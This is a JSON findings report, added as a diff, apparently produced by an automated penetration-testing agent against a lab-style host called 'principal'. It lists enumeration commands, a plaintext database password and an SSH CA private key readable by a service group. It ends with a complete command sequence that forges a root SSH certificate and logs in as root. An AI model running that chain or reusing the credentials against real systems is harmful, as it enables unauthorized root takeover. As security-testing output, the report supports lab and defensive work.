@@ -1,0 +1,117 @@
+{
+  "meta": {
+    "operation": "Principal",
+    "target": "10.129.244.220",
+    "date": "2026-03-24",
+    "agent": "NOIRE v1.0",
+    "status": "COMPLETE"
+  },
+  "objective": {
+    "statement": "Enumerate privilege escalation vectors from svc-deploy to root. Focus on SSH CA cert signing, deployers group permissions, and deployment infrastructure.",
+    "objective_completed": true,
+    "completion_notes": "All enumeration vectors checked. Critical privesc lead identified: SSH CA cert forgery to root."
+  },
+  "current_access": {
+    "user": "svc-deploy",
+    "privilege_level": "user (uid=1001)",
+    "groups": ["svc-deploy", "deployers"],
+    "shell_quality": "stable SSH, full TTY, /bin/bash"
+  },
+  "system_profile": {
+    "hostname": "principal",
+    "os": "Ubuntu 24.04.4 LTS (Noble Numbat)",
+    "kernel": "6.8.0-101-generic x86_64",
+    "containerization": "none (bare metal/VM)"
+  },
+  "high_value_findings": [
+    {
+      "title": "SSH CA private key readable by svc-deploy",
+      "summary": "CA private key at /opt/principal/ssh/ca (RSA 4096, unencrypted) is rw-r----- root:deployers. svc-deploy is in deployers group and can read it. This CA is trusted by sshd via TrustedUserCAKeys.",
+      "confidence": "HIGH",
+      "evidence": "-rw-r----- 1 root deployers 3381 /opt/principal/ssh/ca"
+    },
+    {
+      "title": "No AuthorizedPrincipalsFile — cert principal=root grants root login",
+      "summary": "sshd trusts the CA but does not restrict certificate principals via AuthorizedPrincipalsFile. Any cert signed by the CA with principal matching the login username is accepted. Combined with PermitRootLogin prohibit-password, a cert with principal root grants root SSH access.",
+      "confidence": "HIGH",
+      "evidence": "TrustedUserCAKeys /opt/principal/ssh/ca.pub in 60-principal.conf. AuthorizedPrincipalsFile not configured. PermitRootLogin prohibit-password."
+    }
+  ],
+  "privesc_leads": [
+    {
+      "rank": 1,
+      "path": "SSH CA cert forgery to root",
+      "evidence": "CA privkey readable (/opt/principal/ssh/ca, root:deployers rw-r-----). sshd trusts CA (TrustedUserCAKeys). No AuthorizedPrincipalsFile. PermitRootLogin prohibit-password. Sign a key with principal=root, SSH as root.",
+      "complexity": "LOW",
+      "confidence": "HIGH"
+    },
+    {
+      "rank": 2,
+      "path": "H2 database credential reuse",
+      "evidence": "principal / Pr1nc1p@l_Db_2025! in application.properties. Data dir /opt/principal/app/data/ owned by app user, inaccessible. H2 console disabled.",
+      "complexity": "MEDIUM",
+      "confidence": "LOW"
+    }
+  ],
+  "credentials_and_secrets": [
+    {
+      "type": "ssh_ca_private_key",
+      "location": "/opt/principal/ssh/ca",
+      "notes": "RSA 4096, unencrypted, readable by deployers group. Trusted by sshd for cert-based auth."
+    },
+    {
+      "type": "database_password",
+      "location": "/opt/principal/app/src/main/resources/application.properties",
+      "notes": "H2 DB: principal / Pr1nc1p@l_Db_2025! (jdbc:h2:file:/opt/principal/app/data/principal). Data dir not accessible to svc-deploy. Console disabled."
+    }
+  ],
+  "misconfigurations": [
+    {
+      "category": "file_permissions",
+      "summary": "SSH CA private key readable by deployers group",
+      "evidence": "-rw-r----- root:deployers /opt/principal/ssh/ca — svc-deploy (deployers member) can read the signing key"
+    },
+    {
+      "category": "ssh_config",
+      "summary": "No AuthorizedPrincipalsFile restricts cert principals",
+      "evidence": "AuthorizedPrincipalsFile not configured — any cert signed by trusted CA with principal matching login username is accepted"
+    }
+  ],
+  "anomalies": [
+    {
+      "description": "/opt/principal/deploy/ exists (root:root rwxr-x---) but inaccessible to svc-deploy despite being a deployment service account",
+      "impact": "May contain deploy.sh referenced in README.txt — could be additional privesc vector if accessible via another path"
+    }
+  ],
+  "oracle_flags": [
+    {
+      "priority": 1,
+      "action": "Forge SSH certificate for root using CA key",
+      "rationale": "Trivial exploitation: generate keypair, sign with readable CA key (principal=root), SSH as root. No restrictions on cert principals. Command sequence: ssh-keygen -t ed25519 -f /tmp/pwn -N '' && ssh-keygen -s /opt/principal/ssh/ca -I root-cert -n root -V +1h /tmp/pwn.pub && ssh -i /tmp/pwn -o CertificateFile=/tmp/pwn-cert.pub root@10.129.244.220"
+    },
+    {
+      "priority": 2,
+      "action": "H2 database investigation (low priority)",
+      "rationale": "Credential found but data dir inaccessible to svc-deploy. Only relevant if app user access is obtained or alternative H2 interface discovered."
+    }
+  ],
+  "tools_executed": [
+    {"tool": "remote_exec", "command": "id; whoami; hostname; uname -a", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "echo password | sudo -S -l", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "cat /etc/passwd (interactive shells)", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "ls -la /opt/principal/ssh/", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "cat /opt/principal/ssh/{README.txt,ca,ca.pub}", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "cat /etc/ssh/sshd_config.d/60-principal.conf", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "find / -group deployers; find / -group deployers -writable", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "ps aux", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "find / -perm -4000; find / -perm -2000", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "crontab -l; /etc/crontab; systemctl list-timers", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "getcap -r /; ss -tlnp", "output_file": "memoria_action_log"},
+    {"tool": "remote_exec", "command": "cat application.properties", "output_file": "memoria_action_log"}
+  ],
+  "evidence_refs": [
+    "memoria finding #5: SSH CA private key readable by svc-deploy",
+    "memoria credential #2: SSH CA key at /opt/principal/ssh/ca",
+    "memoria credential #3: H2 DB principal / Pr1nc1p@l_Db_2025!"
+  ]
+}
